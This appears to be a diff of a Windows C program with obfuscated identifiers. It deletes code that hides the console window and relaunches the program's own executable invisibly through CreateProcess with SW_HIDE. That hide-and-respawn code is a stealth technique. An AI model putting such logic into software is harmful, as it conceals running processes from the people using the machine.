@@ -122,29 +122,7 @@ DWORD WINAPI F2(LPVOID O7) {
     return 0;
 }
 
-void StartHidden() {
-    char szPath[MAX_PATH];
-    GetModuleFileName(NULL, szPath, MAX_PATH);
-
-    STARTUPINFO si = { sizeof(STARTUPINFO) };
-    si.dwFlags = STARTF_USESHOWWINDOW;
-    si.wShowWindow = SW_HIDE;
-    PROCESS_INFORMATION pi;
-
-    CreateProcess(szPath, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
-    CloseHandle(pi.hProcess);
-    CloseHandle(pi.hThread);
-}
-
 int wmain() {
-    HWND V15 = GetConsoleWindow();
-    ShowWindow(V15, SW_HIDE);
-
-    if (GetConsoleWindow() != NULL) {
-        StartHidden();
-        return 0;
-    }
-
     DWORD V13;
     HANDLE V14;
 
@@ -156,8 +134,4 @@ int wmain() {
     DeleteCriticalSection(&V3);
     CloseHandle(V14);
     return 0;
-}
-
-int main() {
-    return wmain();
 }
